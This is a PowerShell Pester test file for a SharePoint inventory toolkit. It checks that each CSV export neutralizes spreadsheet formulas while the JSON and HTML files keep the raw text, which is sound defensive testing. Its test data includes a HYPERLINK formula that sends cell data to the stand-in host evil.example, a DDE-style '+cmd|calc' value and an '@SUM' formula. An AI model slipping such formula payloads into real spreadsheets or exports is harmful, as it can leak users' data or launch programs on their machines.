# Every CSV the toolkit writes neutralizes spreadsheet formulas; the JSON files keep the original text.
BeforeAll {
    $repoRoot = Split-Path -Path $PSScriptRoot -Parent
    Import-Module -Name (Join-Path $repoRoot 'src/Modules/SPSSiteInventory.Common/SPSSiteInventory.Common.psd1') -Force

    # A user can type this as a title; it exercises the CSV quoting too.
    $script:Evil = '=HYPERLINK("http://evil.example/?x="&A1,"Click")'

    # Windows PowerShell 5.1 does not unroll a JSON array in a pipeline, so find the row with foreach.
    function Get-RowBy {
        param ($Rows, [string]$Property, [string]$Value)
        foreach ($row in $Rows) {
            if ([string]$row.$Property -eq $Value) { return $row }
        }
    }

    function Get-Json {
        param ([string]$Path)
        Get-Content -Path $Path -Raw | ConvertFrom-Json
    }
}

Describe 'CSV formula neutralization in the exporters' {
    It 'neutralizes the site inventory CSV, keeps numbers as numbers and leaves JSON and HTML raw' {
        $sites = @(
            [PSCustomObject]@{ InventoryScope = 'SiteCollection'; Url = 'https://intranet/sites/a'; Title = $script:Evil; WebApp = 'Intranet'; Category = 1; SizeGB = -1.5; AssessmentStatus = 'Complete' }
            [PSCustomObject]@{ InventoryScope = 'SiteCollection'; Url = 'https://intranet/sites/b'; Title = '-1.5'; WebApp = 'Intranet'; Category = 1; SizeGB = 2.5; AssessmentStatus = 'Complete' }
        )

        $output = Export-SPSInventoryReport -InputObject $sites -OutputFolder $TestDrive -BaseName 'CsvSite'

        $csv = @(Import-Csv -Path $output.CsvPath)
        $csv | Should -HaveCount 2
        $csv[0].Title | Should -BeExactly ("'" + $script:Evil)
        # Export-Csv formats a number with the current culture, so accept a decimal point or comma; there is no quote.
        $csv[0].SizeGB | Should -Match '^-1[.,]5$'
        $csv[1].Title | Should -BeExactly "'-1.5"
        $csv[0].Url | Should -BeExactly 'https://intranet/sites/a'
        @($csv[0].PSObject.Properties.Name) | Should -Be @($sites[0].PSObject.Properties.Name)
        $json = Get-Json -Path $output.JsonPath
        (Get-RowBy -Rows $json -Property Url -Value 'https://intranet/sites/a').Title | Should -BeExactly $script:Evil
        (Get-RowBy -Rows $json -Property Url -Value 'https://intranet/sites/b').Title | Should -BeExactly '-1.5'
        (Get-RowBy -Rows (Get-Json -Path $output.SitesJsonPath) -Property Url -Value 'https://intranet/sites/a').Title | Should -BeExactly $script:Evil
        $html = Get-Content -Path $output.HtmlPath -Raw
        $html | Should -Match 'HYPERLINK'
        $html | Should -Not -Match "(&#39;|')=HYPERLINK"
        $sites[0].Title | Should -BeExactly $script:Evil
    }

    It 'neutralizes the alerts CSV and leaves the alerts JSON raw' {
        $records = @([PSCustomObject]@{
            InventoryScope = 'WebApplication'; Url = 'https://other'; WebAppUrl = 'https://other'
            AssessmentStatus = 'Failed'; SiteInventoryWarnings = $script:Evil; AssessmentWarnings = '+cmd|calc'
        })

        $output = Export-SPSInventoryReport -InputObject $records -OutputFolder $TestDrive -BaseName 'CsvAlerts'

        $csv = @(Import-Csv -Path $output.AlertsCsvPath)
        (Get-RowBy -Rows $csv -Property AlertType -Value 'WebApplicationEnumerationFailed').Value | Should -BeExactly ("'" + $script:Evil)
        (Get-RowBy -Rows $csv -Property AlertType -Value 'AssessmentFailed').Value | Should -BeExactly "'+cmd|calc"
        $json = Get-Json -Path $output.AlertsJsonPath
        (Get-RowBy -Rows $json -Property AlertType -Value 'WebApplicationEnumerationFailed').Value | Should -BeExactly $script:Evil
        (Get-RowBy -Rows $json -Property AlertType -Value 'AssessmentFailed').Value | Should -BeExactly '+cmd|calc'
    }

    It 'neutralizes the content type CSV and leaves the JSON raw' {
        $rows = @([PSCustomObject]@{
            SiteUrl = 'https://intranet/sites/a'; WebUrl = 'https://intranet/sites/a'; Scope = 'Web'; ListTitle = ''; ListUrl = ''
            ContentTypeId = '0x0101'; Name = $script:Evil; Group = '+Custom'; ParentContentTypeId = '0x01'; FieldCount = -1
            FieldTypes = 'Text'; DocumentTemplateUrl = ''; Hidden = $false; ReadOnly = $false; Sealed = $false
        })

        $output = Export-SPSInventoryReport -InputObject @() -ContentTypes $rows -OutputFolder $TestDrive -BaseName 'CsvContentTypes'

        $csv = @(Import-Csv -Path $output.ContentTypesCsvPath)
        $csv | Should -HaveCount 1
        $csv[0].Name | Should -BeExactly ("'" + $script:Evil)
        $csv[0].Group | Should -BeExactly "'+Custom"
        $csv[0].FieldCount | Should -BeExactly '-1'
        $csv[0].SiteUrl | Should -BeExactly 'https://intranet/sites/a'
        (Get-Json -Path $output.ContentTypesJsonPath)[0].Name | Should -BeExactly $script:Evil
    }

    It 'neutralizes the managed metadata CSV and leaves the JSON raw' {
        $rows = @([PSCustomObject]@{
            SiteUrl = 'https://intranet/sites/a'; WebUrl = 'https://intranet/sites/a'; ListTitle = $script:Evil; ListUrl = '/sites/a/Lists/x'
            ListTemplate = 'GenericList'; ListType = 'List'; ListItemCount = 3; ItemLastModifiedDate = '2026-10-01'
            ManagedMetadataColumnCount = 1; ManagedMetadataColumns = '@Department'; TermSetIds = 'aaaaaaaa-0000-0000-0000-000000000001'
        })

        $output = Export-SPSInventoryReport -InputObject @() -ManagedMetadataLists $rows -OutputFolder $TestDrive -BaseName 'CsvMetadata'

        $csv = @(Import-Csv -Path $output.ManagedMetadataCsvPath)
        $csv[0].ListTitle | Should -BeExactly ("'" + $script:Evil)
        $csv[0].ManagedMetadataColumns | Should -BeExactly "'@Department"
        $csv[0].ListItemCount | Should -BeExactly '3'
        (Get-Json -Path $output.ManagedMetadataJsonPath)[0].ListTitle | Should -BeExactly $script:Evil
    }

    It 'neutralizes the external list CSV and leaves the JSON raw' {
        $rows = @([PSCustomObject]@{
            SiteUrl = 'https://intranet/sites/a'; WebUrl = 'https://intranet/sites/a'; ListTitle = $script:Evil; ListUrl = '/sites/a/Lists/Customers'
            LobSystemInstance = '-CrmInstance'; EntityNamespace = 'Contoso.Crm'; Entity = 'Customer'
        })

        $output = Export-SPSInventoryReport -InputObject @() -ExternalLists $rows -OutputFolder $TestDrive -BaseName 'CsvExternal'

        $csv = @(Import-Csv -Path $output.ExternalListsCsvPath)
        $csv[0].ListTitle | Should -BeExactly ("'" + $script:Evil)
        $csv[0].LobSystemInstance | Should -BeExactly "'-CrmInstance"
        (Get-Json -Path $output.ExternalListsJsonPath)[0].ListTitle | Should -BeExactly $script:Evil
    }

    It 'neutralizes the SharePoint alerts CSV, the titles and filters that users type, and leaves the JSON raw' {
        $rows = @([PSCustomObject]@{
            SiteUrl = 'https://intranet/sites/a'; WebUrl = 'https://intranet/sites/a'; AlertId = '11111111-1111-1111-1111-111111111111'
            Title = $script:Evil; AlertTemplateName = 'SPAlertTemplateType.DocumentLibrary'; AlertType = 'List'
            ListUrl = 'Shared Documents'; ListId = '22222222-2222-2222-2222-222222222222'; ItemId = ''
            EventType = 'All'; AlertFrequency = 'Immediate'; AlertTime = ''; Status = 'On'
            DeliveryChannels = 'Email'; AlwaysNotify = $false; DynamicRecipient = ''; Filter = '@SUM(1+1)'
            UserId = 7; UserLoginName = 'i:0#.w|contoso\anna'
        })

        $output = Export-SPSInventoryReport -InputObject @() -SharePointAlerts $rows -OutputFolder $TestDrive -BaseName 'CsvSpAlerts'

        $csv = @(Import-Csv -Path $output.SharePointAlertsCsvPath)
        $csv[0].Title | Should -BeExactly ("'" + $script:Evil)
        $csv[0].Filter | Should -BeExactly "'@SUM(1+1)"
        $csv[0].UserLoginName | Should -BeExactly 'i:0#.w|contoso\anna'
        $csv[0].UserId | Should -BeExactly '7'
        $json = Get-Json -Path $output.SharePointAlertsJsonPath
        $json[0].Title | Should -BeExactly $script:Evil
        $json[0].Filter | Should -BeExactly '@SUM(1+1)'
    }

    It 'neutralizes the BCS CSV and leaves the JSON raw' {
        $rows = @([PSCustomObject]@{
            WebApplicationUrls = 'https://intranet'; BdcServiceApplicationId = '11111111-1111-1111-1111-111111111111'
            LobSystemName = $script:Evil; LobSystemType = 'Wcf'; LobSystemInstances = 'CrmProd'; EntityCount = 1; LobEntities = 'Contoso.Crm.Customer'
        })

        $output = Export-SPSInventoryReport -InputObject @() -BcsApplications $rows -OutputFolder $TestDrive -BaseName 'CsvBcs'

        $csv = @(Import-Csv -Path $output.BcsCsvPath)
        $csv[0].LobSystemName | Should -BeExactly ("'" + $script:Evil)
        $csv[0].LobSystemType | Should -BeExactly 'Wcf'
        (Get-Json -Path $output.BcsJsonPath)[0].LobSystemName | Should -BeExactly $script:Evil
    }

    It 'neutralizes the farm solution CSV and leaves the JSON raw' {
        $map = @([PSCustomObject]@{
            SolutionName = $script:Evil; SolutionId = '11111111-1111-1111-1111-111111111111'; Deployed = $true; DeploymentState = 'GlobalDeployed'
            IsCustom = $true; ContainsGlobalAssembly = $false; ContainsCasPolicy = $false; ContainsWebApplicationResource = $false; IsFullTrustCode = $false
            DeployedWebApplicationCount = 1; DeployedServerCount = 1; FeatureCount = 1; FeatureScopes = @('Site'); FeatureIds = @('aaaaaaaa-0000-0000-0000-000000000001')
        })

        $result = Export-SPSSolutionReport -InputObject $map -OutputFolder $TestDrive -BaseName 'CsvSolutions'

        $csv = @(Import-Csv -Path $result.CsvPath)
        $csv[0].SolutionName | Should -BeExactly ("'" + $script:Evil)
        $csv[0].FeatureScopes | Should -BeExactly 'Site'
        (Get-Json -Path $result.JsonPath)[0].SolutionName | Should -BeExactly $script:Evil
    }

    It 'still writes valid empty CSV files with their header when there is nothing to export' {
        $output = Export-SPSInventoryReport -InputObject @() -ContentTypes @() -SharePointAlerts @() -OutputFolder $TestDrive -BaseName 'CsvEmpty'

        (Get-Content -Path $output.SharePointAlertsCsvPath -TotalCount 1) | Should -Match 'UserLoginName'
        (Get-Content -Path $output.ContentTypesCsvPath -TotalCount 1) | Should -Match 'ContentTypeId'
        @(Import-Csv -Path $output.SharePointAlertsCsvPath) | Should -HaveCount 0
    }
}
